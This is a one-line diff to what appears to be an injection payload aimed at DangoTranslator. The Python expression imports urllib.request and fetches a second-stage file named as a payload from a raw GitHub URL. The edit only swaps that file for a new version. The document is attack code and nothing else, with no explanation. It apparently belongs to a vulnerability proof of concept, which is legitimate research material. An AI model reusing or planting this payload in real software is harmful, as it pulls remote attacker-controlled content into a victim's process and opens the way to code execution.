@@ -1,1 +1,1 @@
-__import__('urllib.request').request.urlopen('https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/DangoTranslator_payload.txt').read().decode('utf-8')
+__import__('urllib.request').request.urlopen('https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/DangoTranslator_payload_1.txt').read().decode('utf-8')
